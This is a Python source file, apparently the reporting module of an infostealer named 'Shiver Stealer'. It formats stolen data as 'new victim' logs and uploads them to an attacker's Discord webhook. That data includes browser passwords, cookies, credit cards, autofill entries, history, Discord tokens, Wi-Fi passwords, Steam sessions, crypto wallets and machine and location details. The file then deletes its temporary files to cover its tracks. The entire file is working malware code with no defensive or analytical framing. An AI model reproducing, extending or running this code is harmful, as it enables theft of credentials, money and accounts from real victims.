import os
import json
import time
import requests
from datetime import datetime

class Webhook:
    def __init__(self, webhook_url):
        self.webhook_url = webhook_url

    def send(self, content=None, embed=None, file_paths=None):
        try:
            data = {}
            if content:
                data['content'] = content
            if embed:
                data['embeds'] = embed if isinstance(embed, list) else [embed]
            if file_paths:
                files = []
                for fp in file_paths:
                    if os.path.exists(fp):
                        files.append(('file', (os.path.basename(fp), open(fp, 'rb'), 'application/octet-stream')))
                if files:
                    if data:
                        data['payload_json'] = json.dumps(data)
                        r = requests.post(self.webhook_url, data=data, files=files, timeout=30)
                    else:
                        r = requests.post(self.webhook_url, files=files, timeout=30)
                    for _, f in files:
                        f[1].close()
                    return r.status_code in (200, 204)
            if data:
                r = requests.post(self.webhook_url, json=data, timeout=30)
                return r.status_code in (200, 204)
            return False
        except:
            return False

    def send_embed(self, embed_dict):
        return self.send(embed=embed_dict)

class WebhookFormatter:
    def __init__(self, webhook_url):
        self.webhook = Webhook(webhook_url)

    def create_victim_embed(self, system_info, geo_info, counters, discord_info=None):
        ip, country, city, isp, org, asn, region, zip_code, lat, lon = geo_info
        sys = system_info
        fields = []

        sys_text = (
            '```\n'
            'PC Name    : ' + str(sys.get('hostname', 'N/A')) + '\n'
            'Username   : ' + str(sys.get('username', 'N/A')) + '\n'
            'HWID       : ' + str(sys.get('hwid', 'N/A')) + '\n'
            'MAC Address: ' + str(sys.get('mac', 'N/A')) + '\n'
            'UUID       : ' + str(sys.get('uuid', 'N/A')) + '\n'
            '```'
        )
        fields.append({'name': 'MACHINE INFO', 'value': sys_text, 'inline': False})

        ip_text = (
            '```\n'
            'IP       : ' + str(ip) + '\n'
            'Country  : ' + str(country) + ' (' + str(region) + ')\n'
            'City     : ' + str(city) + '\n'
            'ISP      : ' + str(isp) + '\n'
            'Org      : ' + str(org) + '\n'
            'ASN      : ' + str(asn) + '\n'
            'Timezone : ' + str(sys.get('timezone', 'N/A')) + '\n'
            '```'
        )
        fields.append({'name': 'NETWORK INFO', 'value': ip_text, 'inline': False})

        spec_text = (
            '```\n'
            'OS   : ' + str(sys.get('windows_version', 'N/A'))[:50] + '\n'
            'Arch : ' + str(sys.get('arch', 'N/A')) + '\n'
            'CPU  : ' + str(sys.get('processor', 'N/A'))[:50] + '\n'
            'Cores: ' + str(sys.get('cpu_count', 'N/A')) + ' / ' + str(sys.get('cpu_physical', 'N/A')) + '\n'
            'RAM  : ' + str(sys.get('ram', 'N/A')) + '\n'
            'Screen: ' + str(sys.get('screen_size', 'N/A')) + '\n'
            'Uptime: ' + str(sys.get('uptime', 'N/A')) + '\n'
            'Boot  : ' + str(sys.get('boot_time', 'N/A')) + '\n'
            '```'
        )
        fields.append({'name': 'SYSTEM SPECS', 'value': spec_text, 'inline': False})

        counter_text = ''
        for label, val in counters:
            counter_text += label + ': ' + str(val) + '\n'
        fields.append({'name': 'GRAB COUNTERS', 'value': '```\n' + counter_text + '```', 'inline': False})

        if discord_info and len(discord_info) > 0:
            dc = discord_info[0]
            avatar_url = dc.get('avatar', 'https://cdn.discordapp.com/embed/avatars/0.png')
            dc_text = (
                '```\n'
                'Username : ' + str(dc.get('username', 'N/A')) + '\n'
                'ID       : ' + str(dc.get('id', 'N/A')) + '\n'
                'Email    : ' + str(dc.get('email', 'N/A')) + '\n'
                'Phone    : ' + str(dc.get('phone', 'N/A')) + '\n'
                'Nitro    : ' + str(dc.get('nitro_str', 'N/A')) + '\n'
                'Billing  : ' + str(dc.get('billing', 'N/A')) + '\n'
                'MFA      : ' + ('Enabled' if dc.get('mfa_enabled') else 'Disabled') + '\n'
                'Badges   : ' + str(dc.get('badges', 'None')) + '\n'
                '```'
                'Token:\n'
                '```\n' + str(dc.get('token', 'N/A')) + '\n```'
            )
            fields.append({'name': 'DISCORD TOKEN', 'value': dc_text, 'inline': False})
            thumbnail = {'url': avatar_url}
        else:
            thumbnail = None

        embed = {
            'title': 'SHIVER STEALER - NEW VICTIM LOG',
            'color': 0x00b4d8,
            'fields': fields,
            'footer': {'text': 'Shiver Stealer | ' + datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S')},
            'timestamp': datetime.utcnow().isoformat()
        }
        if thumbnail:
            embed['thumbnail'] = thumbnail
        return embed

    def send_all(self, system_info, geo_info, browser_stealer, discord_info, roblox_data,
                 instagram_data, steam_data, mc_data, wallet_stealer, wifi_data, kiwi_stealer,
                 windows_key, software_list, telegram_data):
        ip = geo_info[0]
        pc_name = system_info.get('hostname', 'Unknown')
        mention_text = '@everyone New victim: ' + str(pc_name) + ' | ' + str(ip)

        discord_count = len(discord_info)
        wallet_count = len(wallet_stealer.wallets) if wallet_stealer else 0
        kiwi_count = len(kiwi_stealer.found_files) if kiwi_stealer else 0
        telegram_found = 1 if telegram_data else 0

        steam_count = len(steam_data.get('accounts', {})) if steam_data else 0

        total_counts = getattr(browser_stealer, 'total_counts', {})
        counters = [
            ('Passwords', total_counts.get('passwords', 0)),
            ('Cookies', total_counts.get('cookies', 0)),
            ('Credit Cards', total_counts.get('credit_cards', 0)),
            ('Autofills', total_counts.get('autofills', 0)),
            ('History', total_counts.get('history', 0)),
            ('Discord Tokens', discord_count),
            ('Steam Accounts', steam_count),
            ('Crypto Wallets', wallet_count),
            ('Interesting Files', kiwi_count),
            ('Wi-Fi Networks', len(wifi_data)),
        ]

        file_paths = []

        pw_text = self._format_passwords(browser_stealer)
        if pw_text:
            pw_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_passwords.txt')
            with open(pw_path, 'w', encoding='utf-8') as f:
                f.write(pw_text)
            file_paths.append(pw_path)

        ck_text = self._format_cookies(browser_stealer)
        if ck_text:
            ck_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_cookies.txt')
            with open(ck_path, 'w', encoding='utf-8') as f:
                f.write(ck_text)
            file_paths.append(ck_path)

        cc_text = self._format_credit_cards(browser_stealer)
        if cc_text:
            cc_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_credit_cards.txt')
            with open(cc_path, 'w', encoding='utf-8') as f:
                f.write(cc_text)
            file_paths.append(cc_path)

        af_text = self._format_autofills(browser_stealer)
        if af_text:
            af_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_autofills.txt')
            with open(af_path, 'w', encoding='utf-8') as f:
                f.write(af_text)
            file_paths.append(af_path)

        dc_text = self._format_discord(discord_info)
        if dc_text:
            dc_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_discord_tokens.txt')
            with open(dc_path, 'w', encoding='utf-8') as f:
                f.write(dc_text)
            file_paths.append(dc_path)

        wf_text = self._format_wifi(wifi_data)
        if wf_text:
            wf_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_wifi_passwords.txt')
            with open(wf_path, 'w', encoding='utf-8') as f:
                f.write(wf_text)
            file_paths.append(wf_path)

        kiwi_text = self._format_kiwi(kiwi_stealer)
        if kiwi_text:
            kiwi_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_interesting_files.txt')
            with open(kiwi_path, 'w', encoding='utf-8') as f:
                f.write(kiwi_text)
            file_paths.append(kiwi_path)

        hist_text = self._format_history(browser_stealer)
        if hist_text:
            hist_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_history.txt')
            with open(hist_path, 'w', encoding='utf-8') as f:
                f.write(hist_text)
            file_paths.append(hist_path)

        victim_embed = self.create_victim_embed(system_info, geo_info, counters, discord_info)
        self.webhook.send(content=mention_text, embed=victim_embed)

        batch = []
        for fp in file_paths:
            batch.append(fp)
            if len(batch) >= 8:
                self.webhook.send(file_paths=batch)
                batch = []
        if batch:
            self.webhook.send(file_paths=batch)

        extra_parts = []

        if roblox_data:
            extra_parts.append('ROBLOX\n' + '=' * 40 + '\nUsername: ' + str(roblox_data.get('username', 'N/A')) + '\nID: ' + str(roblox_data.get('id', 'N/A')) + '\nRobux: ' + str(roblox_data.get('robux', 0)) + '\nPremium: ' + str(roblox_data.get('premium', False)) + '\nCookie: ' + str(roblox_data.get('cookie', 'N/A'))[:200])

        if instagram_data:
            extra_parts.append('INSTAGRAM\n' + '=' * 40 + '\nUsername: ' + str(instagram_data.get('username', 'N/A')) + '\nFull Name: ' + str(instagram_data.get('full_name', 'N/A')) + '\nEmail: ' + str(instagram_data.get('email', 'N/A')) + '\nPhone: ' + str(instagram_data.get('phone', 'N/A')) + '\nFollowers: ' + str(instagram_data.get('followers', 'N/A')) + '\nFollowing: ' + str(instagram_data.get('following', 'N/A')))

        if steam_data and steam_data.get('found'):
            accts = steam_data.get('account_names', [])
            acct_str = ', '.join(accts) if accts else 'None'
            extra_parts.append('STEAM\n' + '=' * 40 + '\nPath: ' + str(steam_data.get('path', 'N/A')) + '\nAccounts: ' + acct_str + '\nSSFN Count: ' + str(steam_data.get('ssfn_count', 0)) + '\nRegistry: ' + str(steam_data.get('reg_path', 'N/A')))
            steam_zip = steam_data.get('zip_path')
            if steam_zip and os.path.exists(steam_zip):
                try:
                    self.webhook.send(content='Steam Session Data:', file_paths=[steam_zip])
                except:
                    pass
                try:
                    os.remove(steam_zip)
                except:
                    pass

        if mc_data and mc_data.get('accounts'):
            mc_text = 'MINECRAFT\n' + '=' * 40 + '\n'
            for acc in mc_data['accounts'][:5]:
                mc_text += '\nUsername: ' + str(acc.get('username', 'N/A')) + '\nUUID: ' + str(acc.get('uuid', 'N/A'))
            extra_parts.append(mc_text)

        if telegram_data:
            extra_parts.append('TELEGRAM\n' + '=' * 40 + '\nSession data found at: ' + str(telegram_data))

        if windows_key and windows_key != 'Not Found':
            extra_parts.append('WINDOWS PRODUCT KEY\n' + '=' * 40 + '\nKey: ' + str(windows_key))

        if wallet_stealer and wallet_stealer.wallets:
            wallet_zips = []
            for name, path in wallet_stealer.wallets.items():
                if os.path.exists(path):
                    wallet_zips.append(path)
            if wallet_zips:
                batch = []
                for wp in wallet_zips:
                    batch.append(wp)
                    if len(batch) >= 8:
                        self.webhook.send(content='Crypto Wallets:', file_paths=batch)
                        batch = []
                if batch:
                    self.webhook.send(content='Crypto Wallets:', file_paths=batch)

        if extra_parts:
            combined = '\n\n'.join(extra_parts)
            extra_path = os.path.join(os.environ.get('TEMP', os.path.expanduser('~')), 'shiver_extra_data.txt')
            with open(extra_path, 'w', encoding='utf-8') as f:
                f.write(combined)
            self.webhook.send(file_paths=[extra_path])

        for fp in file_paths:
            try:
                os.remove(fp)
            except:
                pass

    def _format_passwords(self, bs):
        if not bs.passwords:
            return ''
        text = 'SHIVER STEALER - PASSWORDS DUMP\n' + '=' * 60 + '\n\n'
        for key, entries in bs.passwords.items():
            browser, profile = key.split('_', 1)
            text += '[ ' + browser.upper() + ' - ' + profile + ' ]\n' + '-' * 40 + '\n'
            for url, username, password in entries:
                text += 'URL: ' + url + '\nUSER: ' + username + '\nPASS: ' + password + '\n' + '-' * 40 + '\n'
            text += '\n'
        return text

    def _format_cookies(self, bs):
        if not bs.cookies:
            return ''
        text = 'SHIVER STEALER - COOKIES DUMP\n' + '=' * 60 + '\n\n'
        for key, entries in bs.cookies.items():
            browser, profile = key.split('_', 1)
            text += '[ ' + browser.upper() + ' - ' + profile + ' - ' + str(len(entries)) + ' cookies ]\n' + '-' * 40 + '\n'
            for entry in entries[:200]:
                text += entry + '\n'
            text += '\n'
        return text

    def _format_credit_cards(self, bs):
        if not bs.credit_cards:
            return ''
        text = 'SHIVER STEALER - CREDIT CARDS\n' + '=' * 60 + '\n\n'
        for key, entries in bs.credit_cards.items():
            browser, profile = key.split('_', 1)
            text += '[ ' + browser.upper() + ' - ' + profile + ' ]\n' + '-' * 40 + '\n'
            for number, exp_m, exp_y, name in entries:
                text += 'Card: ' + number + '\nExp: ' + exp_m + '/' + exp_y + '\nName: ' + name + '\n' + '-' * 40 + '\n'
            text += '\n'
        return text

    def _format_autofills(self, bs):
        if not bs.autofills:
            return ''
        text = 'SHIVER STEALER - AUTOFILL DATA\n' + '=' * 60 + '\n\n'
        for key, entries in bs.autofills.items():
            for name, value in entries[:50]:
                text += 'Field: ' + name + '\nValue: ' + value + '\n' + '-' * 40 + '\n'
        return text

    def _format_discord(self, info_list):
        if not info_list:
            return ''
        text = 'SHIVER STEALER - DISCORD TOKENS\n' + '=' * 60 + '\n\n'
        for info in info_list:
            text += '[ ACCOUNT: ' + info.get('username', 'N/A') + ' ]\n' + '-' * 40 + '\n'
            text += 'ID: ' + info.get('id', 'N/A') + '\n'
            text += 'Email: ' + info.get('email', 'N/A') + '\n'
            text += 'Phone: ' + info.get('phone', 'N/A') + '\n'
            text += 'Nitro: ' + info.get('nitro_str', 'N/A') + '\n'
            text += 'Billing: ' + info.get('billing', 'N/A') + '\n'
            text += 'MFA: ' + ('Enabled' if info.get('mfa_enabled') else 'Disabled') + '\n'
            text += 'Badges: ' + info.get('badges', 'None') + '\n'
            text += 'Token: ' + info.get('token', 'N/A') + '\n'
            text += '\nFriends:\n'
            for f in info.get('friends', [])[:10]:
                text += '  ' + str(f) + '\n'
            text += '\nHQ Guilds:\n'
            for g in info.get('guilds', ([], []))[1][:10]:
                text += '  ' + str(g) + '\n'
            text += '\n' + '=' * 40 + '\n'
        return text

    def _format_wifi(self, data):
        if not data:
            return ''
        text = 'SHIVER STEALER - WI-FI PASSWORDS\n' + '=' * 60 + '\n\n'
        for ssid, password in data:
            text += 'SSID: ' + ssid + '\nPASS: ' + password + '\n' + '-' * 40 + '\n'
        return text

    def _format_kiwi(self, ks):
        if not ks or not ks.found_files:
            return ''
        text = 'SHIVER STEALER - INTERESTING FILES\n' + '=' * 60 + '\n\n'
        for f in ks.found_files:
            text += 'File: ' + os.path.basename(f['path']) + '\n'
            text += 'Path: ' + f['path'] + '\n'
            text += 'Size: ' + str(f['size']) + ' bytes\n'
            if f.get('content'):
                text += 'Content:\n' + f['content'][:500] + '\n'
            text += '-' * 40 + '\n'
        return text

    def _format_history(self, bs):
        if not bs.history:
            return ''
        text = 'SHIVER STEALER - BROWSING HISTORY\n' + '=' * 60 + '\n\n'
        for key, entries in bs.history.items():
            browser, profile = key.split('_', 1)
            text += '[ ' + browser.upper() + ' - ' + profile + ' - ' + str(len(entries)) + ' entries ]\n' + '-' * 40 + '\n'
            for url, title, last_visit in entries[:100]:
                text += 'URL: ' + url + '\n'
                text += 'Title: ' + title + '\n'
                if last_visit:
                    try:
                        if last_visit > 10000000000000000:
                            epoch = (last_visit - 11644473600000000) / 10000000
                        else:
                            epoch = last_visit / 1000000
                        text += 'Visited: ' + time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(epoch)) + '\n'
                    except:
                        pass
                text += '-' * 40 + '\n'
            text += '\n'
        return text
